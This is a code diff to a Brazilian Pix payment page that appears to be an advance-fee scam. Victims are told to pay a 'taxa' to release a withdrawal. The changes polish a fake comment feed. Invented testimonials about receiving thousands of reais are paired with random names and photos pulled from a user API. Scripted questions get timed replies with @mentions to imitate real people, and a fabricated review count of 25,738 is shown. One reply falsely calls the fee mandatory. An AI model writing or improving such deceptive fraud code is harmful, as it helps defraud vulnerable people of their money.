@@ -59,17 +59,18 @@
 
         .form-group { margin-bottom: 15px; }
         .form-group label { display: block; font-size: 12px; font-weight: 600; color: var(--txt2); margin-bottom: 6px; }
-        .form-input { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 12px; font-size: 14px; outline: none; background: #fafafa; }
+        .form-input { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 12px; font-size: 14px; font-family:'Montserrat'; outline: none; background: #fafafa; }
         .btn-submit { width: 100%; height: 55px; background: linear-gradient(135deg, var(--primary), var(--primary-light)); color: #fff; border: none; border-radius: 14px; font-size: 16px; font-weight: 800; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;}
 
-        /* COMENTÁRIOS ESTILO FACEBOOK/GOV */
-        .fb-header-outside { margin-top: 15px; padding: 10px 0; font-size: 14px; font-weight: bold; color: var(--txt2); }
+        /* COMENTÁRIOS ESTILO SHOPEE/SOCIAL */
+        .fb-header-outside { margin-top: 15px; padding: 10px 0; font-size: 14px; font-weight: 800; color: var(--txt1); }
         .comment-item { display: flex; align-items: flex-start; margin-bottom: 16px; width: 100%; animation: fadeIn 0.5s ease; }
-        .comment-avatar { width: 40px; height: 40px; border-radius: 50%; margin-right: 8px; object-fit: cover; background: #eee; }
-        .comment-content { background: #f0f2f5; border-radius: 18px; padding: 10px 14px; flex: 1; position: relative; }
-        .comment-name { font-size: 13px; font-weight: bold; color: var(--primary); margin-bottom: 2px; }
-        .comment-text { font-size: 13px; color: #050505; line-height: 1.4; }
-        .comment-actions { display: flex; margin-top: 4px; font-size: 11px; color: #65676b; gap: 12px; font-weight: 600; }
+        .comment-avatar { width: 42px; height: 42px; border-radius: 50%; margin-right: 10px; object-fit: cover; background: #eee; flex-shrink: 0; }
+        .comment-content { background: #fff; border: 1px solid var(--border); border-radius: 18px; padding: 12px 16px; flex: 1; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+        .comment-name { font-size: 13px; font-weight: 800; color: var(--txt1); margin-bottom: 3px; }
+        .comment-text { font-size: 13px; color: #333; line-height: 1.5; font-weight: 500; }
+        .comment-text b { color: var(--primary); font-weight: 700; }
+        .comment-actions { display: flex; margin-top: 8px; font-size: 11px; color: var(--txt2); gap: 15px; font-weight: 700; }
 
         /* TELA PIX */
         .progress{width:100%;height:5px;background:#efefef;border-radius:3px;overflow:hidden;margin-bottom:18px}
@@ -83,7 +84,7 @@
         .copy-btn{background:var(--primary);color:#fff;border:none;padding:10px 15px;border-radius:10px;font-weight:bold; cursor: pointer;}
 
         .status-bar{display:flex;align-items:center;justify-content:center;gap:10px;padding:13px;background:#fafafa;border-radius:14px;margin-top:18px; font-size: 12px; font-weight: 600; color: var(--txt2);}
-        .status-spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
+        .status-spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:var(--primary);border-radius:50%;animation:spin .7s linear infinite}
         
         @keyframes spin { 100% { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -114,11 +115,10 @@
     </div>
 
     <div id="fb-section">
-        <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
-        <div id="fb-comments-container">
-            </div>
-        <div style="text-align:center; padding: 10px; font-size: 12px; color: var(--txt2);" id="fb-loading">
-            <i class="fas fa-spinner fa-spin"></i> Carregando comentários atualizados...
+        <div class="fb-header-outside">Avaliações de Clientes (25.738)</div>
+        <div id="fb-comments-container"></div>
+        <div style="text-align:center; padding: 15px; font-size: 11px; color: var(--txt3);" id="fb-loading">
+            <i class="fas fa-spinner fa-spin"></i> Atualizando avaliações recentes...
         </div>
     </div>
 
@@ -153,7 +153,7 @@ document.getElementById('cpf').addEventListener('input', e => {
     e.target.value = v;
 });
 
-// GERAR PIX (VIA PHP)
+// GERAR PIX
 document.getElementById('checkoutForm').addEventListener('submit', async function(e) {
     e.preventDefault();
     const btn = document.getElementById('btnGerar');
@@ -203,7 +203,6 @@ document.getElementById('checkoutForm').addEventListener('submit', async functio
     }
 });
 
-// STATUS E REDIRECIONAMENTO
 function pixPolling() {
     _pixTimer = setInterval(async function() {
         try {
@@ -223,21 +222,20 @@ function pixPolling() {
     }, 3000);
 }
 
-// --- LOGICA DE COMENTARIOS AVANÇADA (SHopee Style) ---
-var totalComments = 25738;
+// --- LOGICA DE COMENTARIOS AVANÇADA ---
 const fbContainer = document.getElementById('fb-comments-container');
 
 const initialTestimonials = [
     "Gente, pode confiar! Acabei de pagar a taxa e em menos de 5 minutos o dinheiro já caiu na minha conta. Veio R$ 3.200 certinho!",
     "Tava com medo de ser golpe, mas arrisquei e deu certo. Paguei a taxa agora e o saque de R$ 2.450 caiu na hora kkkk top demais!",
-    "O meu demorou uns 8 minutos depois que paguei o pix, mas caiu! Recebi R$ 4.100. Muito obrigado por esse programa!",
+    "O meu demorou uns 8 minutos depois que paguei o pix, mas caiu! Recebi R$ 4.100. Muito obrigado!",
     "Acabei de fazer o pagamento da taxa e já recebi a confirmação. O dinheiro já tá no bolso! Vale a pena demais.",
-    "Maravilhoso! Paguei a taxa e o saque caiu rapidinho, nem acreditei quando vi a notificação do banco. R$ 2.800 na conta!"
+    "Maravilhoso! Paguei a taxa e o saque caiu rapidinho, nem acreditei quando vi a notificação. R$ 2.800 na conta!"
 ];
 
 const conversationPool = [
     { q: "Alguém aí já pagou e recebeu de verdade?", a: "Eu recebi! Paguei e em 5 minutos tava na conta. Pode ir sem medo." },
-    { q: "É seguro pagar esse pix da taxa?", a: "Sim, é o imposto obrigatório. Eu paguei e liberou na mesma hora pra mim." },
+    { q: "É seguro pagar esse pix da taxa?", a: "Sim, é obrigatório. Eu paguei e liberou na mesma hora pra mim." },
     { q: "Demora quanto tempo pra cair o dinheiro?", a: "O meu caiu em menos de 10 minutos depois que paguei." },
     { q: "Funciona mesmo ou é conversa?", a: "Funciona sim, acabei de sacar R$ 3.500 aqui!" }
 ];
@@ -251,10 +249,11 @@ async function createComment(name, avatar, text) {
             <div class="comment-name">${name}</div>
             <div class="comment-text">${text}</div>
             <div class="comment-actions">
-                <span>Curtir</span> <span>Responder</span> <span>Agora</span>
+                <span>Curtir</span> <span>Responder</span> <span>há 1 min</span>
             </div>
         </div>`;
     fbContainer.insertBefore(cItem, fbContainer.firstChild);
+    if(fbContainer.children.length > 15) fbContainer.removeChild(fbContainer.lastChild);
 }
 
 async function getRandomUser() {
@@ -266,27 +265,43 @@ async function getRandomUser() {
 async function spawnRandom() {
     const user = await getRandomUser();
     const type = Math.random();
+    
     if (type > 0.4) {
-        const texts = ["Recebi R$ 2.200 hoje!", "Acabou de cair aqui! R$ 3.150 na conta", "Gente do céu, caiu mesmo! Paguei a taxa tem 5 min."];
-        createComment(user.name.first + " " + user.name.last, user.picture.medium, texts[Math.floor(Math.random()*texts.length)]);
+        const texts = [
+            "Recebi R$ 2.200 hoje, paguei a taxa e foi super rápido!",
+            "Acabou de cair aqui! R$ 3.150 na conta, valeu galera!",
+            "Fiz agora e já recebi. Programa nota 10!",
+            "Gente do céu, caiu mesmo! Paguei a taxa tem 5 min.",
+            "Tava na dúvida, mas paguei e o saque liberou na hora."
+        ];
+        createComment(`${user.name.first} ${user.name.last}`, user.picture.medium, texts[Math.floor(Math.random()*texts.length)]);
     } else {
+        // GERAR CONVERSA COM @NOME
         const chat = conversationPool[Math.floor(Math.random()*conversationPool.length)];
-        createComment(user.name.first + " " + user.name.last, user.picture.medium, chat.q);
+        const firstName = user.name.first;
+        const fullName = `${firstName} ${user.name.last}`;
+        
+        createComment(fullName, user.picture.medium, chat.q);
+        
+        // Resposta após 4 segundos para simular digitação
         setTimeout(async () => {
             const user2 = await getRandomUser();
-            createComment(user2.name.first + " " + user2.name.last, user2.picture.medium, chat.a);
-        }, 3000);
+            const textWithMention = `<b>@${firstName}</b> ${chat.a}`;
+            createComment(`${user2.name.first} ${user2.name.last}`, user2.picture.medium, textWithMention);
+        }, 4000);
     }
 }
 
-// Iniciar Comentários
+// Iniciar Primeiros Comentários (Mais lento)
 initialTestimonials.forEach((t, i) => {
     setTimeout(async () => {
         const user = await getRandomUser();
-        createComment(user.name.first + " " + user.name.last, user.picture.medium, t);
-    }, i * 1000);
+        createComment(`${user.name.first} ${user.name.last}`, user.picture.medium, t);
+    }, i * 3000);
 });
-setInterval(spawnRandom, 8000);
+
+// Loop Infinito mais lento (12 segundos)
+setInterval(spawnRandom, 12000);
 
 // AUXILIARES
 function startCountdown(sec) {
